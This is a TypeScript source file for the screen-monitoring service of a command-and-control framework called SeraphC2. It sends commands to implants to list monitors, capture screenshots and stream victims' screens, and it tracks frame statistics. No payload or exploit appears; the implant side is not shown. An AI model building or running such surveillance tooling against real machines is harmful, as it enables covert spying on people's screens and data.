/**
 * ScreenService - Manages screen monitoring and capture operations on implants
 * Implements requirements 9.1, 9.2, 9.3 from the SeraphC2 specification
 */

import { EventEmitter } from 'events';
import { CommandManager } from '../engine/command-manager';
import {
  MonitorInfo,
  ScreenStreamConfig,
  ScreenStreamFrame,
  ScreenStreamStatus,
  ScreenshotRequest,
  ScreenshotResult,
  CommandType,
  Command,
} from '../../types/entities';
import { Logger } from '../../utils/logger';

export interface ScreenMonitoringResponse {
  monitors: MonitorInfo[];
  totalCount: number;
  timestamp: Date;
}

export interface ScreenStreamStartResult {
  success: boolean;
  message: string;
  streamId?: string;
  config?: ScreenStreamConfig;
}

export interface ScreenStreamStopResult {
  success: boolean;
  message: string;
  streamId?: string | undefined;
  frameCount?: number;
  totalDataSent?: number;
}

export class ScreenService extends EventEmitter {
  private commandManager: CommandManager;
  private logger: Logger;
  private activeStreams: Map<string, ScreenStreamStatus> = new Map();

  constructor(commandManager: CommandManager) {
    super();
    this.commandManager = commandManager;
    this.logger = Logger.getInstance();
  }

  /**
   * Get available monitors from an implant
   */
  async getMonitors(implantId: string, operatorId: string): Promise<ScreenMonitoringResponse> {
    try {
      this.logger.info('Getting monitor information', { implantId, operatorId });

      const command = await this.commandManager.executeCommand({
        implantId,
        operatorId,
        type: CommandType.SCREEN_MONITORS,
        payload: '',
        timeout: 15000,
      });

      const result = await this.waitForCommandCompletion(command.id, 20000);

      if (!result || !result.result?.stdout) {
        throw new Error('Failed to get monitor information from implant');
      }

      const monitors = this.parseMonitorList(result.result.stdout);

      const response: ScreenMonitoringResponse = {
        monitors,
        totalCount: monitors.length,
        timestamp: new Date(),
      };

      this.emit('monitorsRetrieved', {
        implantId,
        operatorId,
        monitorCount: response.totalCount,
      });

      return response;
    } catch (error) {
      this.logger.error('Failed to get monitor information', {
        error: error instanceof Error ? error.message : 'Unknown error',
        implantId,
        operatorId,
      });
      throw error;
    }
  }

  /**
   * Take a screenshot from an implant
   */
  async takeScreenshot(
    implantId: string,
    operatorId: string,
    request: ScreenshotRequest
  ): Promise<ScreenshotResult> {
    try {
      this.logger.info('Taking screenshot', { implantId, operatorId, request });

      const payload = JSON.stringify({
        monitorId: request.monitorId,
        quality: request.quality || 75,
        width: request.width,
        height: request.height,
        captureMouseCursor: request.captureMouseCursor !== false,
      });

      const command = await this.commandManager.executeCommand({
        implantId,
        operatorId,
        type: CommandType.SCREENSHOT,
        payload,
        timeout: 30000,
      });

      const result = await this.waitForCommandCompletion(command.id, 35000);

      if (!result || !result.result?.stdout) {
        throw new Error('Failed to take screenshot from implant');
      }

      const screenshot = this.parseScreenshotResult(result.result.stdout);

      this.emit('screenshotTaken', {
        implantId,
        operatorId,
        monitorId: screenshot.monitorId,
        size: screenshot.size,
      });

      return screenshot;
    } catch (error) {
      this.logger.error('Failed to take screenshot', {
        error: error instanceof Error ? error.message : 'Unknown error',
        implantId,
        operatorId,
      });
      throw error;
    }
  }

  /**
   * Start screen streaming from an implant
   */
  async startScreenStream(
    implantId: string,
    operatorId: string,
    config: ScreenStreamConfig
  ): Promise<ScreenStreamStartResult> {
    try {
      this.logger.info('Starting screen stream', { implantId, operatorId, config });

      // Validate config
      if (config.quality < 1 || config.quality > 100) {
        throw new Error('Quality must be between 1 and 100');
      }

      if (config.frameRate < 1 || config.frameRate > 30) {
        throw new Error('Frame rate must be between 1 and 30 FPS');
      }

      const payload = JSON.stringify(config);

      const command = await this.commandManager.executeCommand({
        implantId,
        operatorId,
        type: CommandType.SCREEN_STREAM_START,
        payload,
        timeout: 15000,
      });

      const result = await this.waitForCommandCompletion(command.id, 20000);

      if (!result) {
        throw new Error('Command timed out or failed');
      }

      const success = result.result?.exitCode === 0;
      const message = success
        ? result.result?.stdout || 'Screen stream started successfully'
        : result.result?.stderr || 'Failed to start screen stream';

      if (success) {
        const streamId = `${implantId}-${Date.now()}`;
        const streamStatus: ScreenStreamStatus = {
          isActive: true,
          monitorId: config.monitorId || 0,
          config,
          frameCount: 0,
          totalDataSent: 0,
          averageFrameSize: 0,
          actualFrameRate: 0,
          startTime: new Date(),
        };

        this.activeStreams.set(streamId, streamStatus);

        this.emit('screenStreamStarted', {
          implantId,
          operatorId,
          streamId,
          config,
        });

        return {
          success: true,
          message,
          streamId,
          config,
        };
      } else {
        return {
          success: false,
          message,
        };
      }
    } catch (error) {
      this.logger.error('Failed to start screen stream', {
        error: error instanceof Error ? error.message : 'Unknown error',
        implantId,
        operatorId,
      });
      throw error;
    }
  }

  /**
   * Stop screen streaming from an implant
   */
  async stopScreenStream(implantId: string, operatorId: string): Promise<ScreenStreamStopResult> {
    try {
      this.logger.info('Stopping screen stream', { implantId, operatorId });

      const command = await this.commandManager.executeCommand({
        implantId,
        operatorId,
        type: CommandType.SCREEN_STREAM_STOP,
        payload: '',
        timeout: 15000,
      });

      const result = await this.waitForCommandCompletion(command.id, 20000);

      if (!result) {
        throw new Error('Command timed out or failed');
      }

      const success = result.result?.exitCode === 0;
      const message = success
        ? result.result?.stdout || 'Screen stream stopped successfully'
        : result.result?.stderr || 'Failed to stop screen stream';

      // Find and remove active stream
      let streamId: string | undefined;
      let frameCount = 0;
      let totalDataSent = 0;

      for (const [id, status] of this.activeStreams.entries()) {
        if (id.startsWith(implantId)) {
          streamId = id;
          frameCount = status.frameCount;
          totalDataSent = status.totalDataSent;
          this.activeStreams.delete(id);
          break;
        }
      }

      this.emit('screenStreamStopped', {
        implantId,
        operatorId,
        streamId,
        frameCount,
        totalDataSent,
      });

      return {
        success,
        message,
        streamId: streamId || undefined,
        frameCount,
        totalDataSent,
      };
    } catch (error) {
      this.logger.error('Failed to stop screen stream', {
        error: error instanceof Error ? error.message : 'Unknown error',
        implantId,
        operatorId,
      });
      throw error;
    }
  }

  /**
   * Update screen stream configuration
   */
  async updateStreamConfig(
    implantId: string,
    operatorId: string,
    config: Partial<ScreenStreamConfig>
  ): Promise<ScreenStreamStartResult> {
    try {
      this.logger.info('Updating screen stream config', { implantId, operatorId, config });

      const payload = JSON.stringify(config);

      const command = await this.commandManager.executeCommand({
        implantId,
        operatorId,
        type: CommandType.SCREEN_STREAM_CONFIG,
        payload,
        timeout: 15000,
      });

      const result = await this.waitForCommandCompletion(command.id, 20000);

      if (!result) {
        throw new Error('Command timed out or failed');
      }

      const success = result.result?.exitCode === 0;
      const message = success
        ? result.result?.stdout || 'Screen stream configuration updated successfully'
        : result.result?.stderr || 'Failed to update screen stream configuration';

      // Update active stream config if exists
      for (const [id, status] of this.activeStreams.entries()) {
        if (id.startsWith(implantId)) {
          status.config = { ...status.config, ...config };
          break;
        }
      }

      this.emit('screenStreamConfigUpdated', {
        implantId,
        operatorId,
        config,
      });

      return {
        success,
        message,
      };
    } catch (error) {
      this.logger.error('Failed to update screen stream config', {
        error: error instanceof Error ? error.message : 'Unknown error',
        implantId,
        operatorId,
      });
      throw error;
    }
  }

  /**
   * Get active stream status
   */
  getStreamStatus(implantId: string): ScreenStreamStatus | null {
    for (const [id, status] of this.activeStreams.entries()) {
      if (id.startsWith(implantId)) {
        return status;
      }
    }
    return null;
  }

  /**
   * Get all active streams
   */
  getAllActiveStreams(): Map<string, ScreenStreamStatus> {
    return new Map(this.activeStreams);
  }

  /**
   * Process incoming screen frame data
   */
  processScreenFrame(implantId: string, frameData: ScreenStreamFrame): void {
    try {
      // Find active stream and update statistics
      for (const [id, status] of this.activeStreams.entries()) {
        if (id.startsWith(implantId)) {
          status.frameCount++;
          status.totalDataSent += frameData.size;
          status.averageFrameSize = status.totalDataSent / status.frameCount;
          status.lastFrameTime = frameData.timestamp;

          // Calculate actual frame rate
          if (status.startTime) {
            const elapsedSeconds =
              (frameData.timestamp.getTime() - status.startTime.getTime()) / 1000;
            status.actualFrameRate = status.frameCount / elapsedSeconds;
          }

          break;
        }
      }

      this.emit('screenFrame', {
        implantId,
        frameData,
      });
    } catch (error) {
      this.logger.error('Failed to process screen frame', {
        error: error instanceof Error ? error.message : 'Unknown error',
        implantId,
        frameId: frameData.frameId,
      });
    }
  }

  /**
   * Wait for command completion with timeout
   */
  private async waitForCommandCompletion(
    commandId: string,
    timeout: number
  ): Promise<Command | null> {
    return new Promise(resolve => {
      const startTime = Date.now();

      const checkCommand = async () => {
        try {
          const command = await this.commandManager.getCommandStatus(commandId);

          if (
            command &&
            (command.status === 'completed' ||
              command.status === 'failed' ||
              command.status === 'timeout')
          ) {
            resolve(command);
            return;
          }

          if (Date.now() - startTime > timeout) {
            resolve(null);
            return;
          }

          setTimeout(checkCommand, 1000);
        } catch (error) {
          resolve(null);
        }
      };

      checkCommand();
    });
  }

  /**
   * Parse monitor list from PowerShell JSON output
   */
  private parseMonitorList(output: string): MonitorInfo[] {
    try {
      const data = JSON.parse(output);
      const monitors = Array.isArray(data) ? data : [data];

      return monitors.map((monitor: any) => ({
        id: monitor.Id || 0,
        name: monitor.Name || `Monitor ${monitor.Id || 0}`,
        isPrimary: monitor.IsPrimary || false,
        width: monitor.Width || 1920,
        height: monitor.Height || 1080,
        x: monitor.X || 0,
        y: monitor.Y || 0,
        workingAreaWidth: monitor.WorkingAreaWidth || monitor.Width || 1920,
        workingAreaHeight: monitor.WorkingAreaHeight || monitor.Height || 1080,
        workingAreaX: monitor.WorkingAreaX || monitor.X || 0,
        workingAreaY: monitor.WorkingAreaY || monitor.Y || 0,
        bitsPerPixel: monitor.BitsPerPixel || 32,
      }));
    } catch (error) {
      this.logger.error('Failed to parse monitor list', { error, output });
      return [];
    }
  }

  /**
   * Parse screenshot result from JSON output
   */
  private parseScreenshotResult(output: string): ScreenshotResult {
    try {
      const data = JSON.parse(output);

      return {
        monitorId: data.monitorId || 0,
        width: data.width || 0,
        height: data.height || 0,
        imageData: data.imageData || '',
        size: data.size || 0,
        timestamp: data.timestamp ? new Date(data.timestamp) : new Date(),
        capturedMouseCursor: data.capturedMouseCursor || false,
      };
    } catch (error) {
      this.logger.error('Failed to parse screenshot result', { error, output });
      throw new Error('Invalid screenshot data received from implant');
    }
  }
}
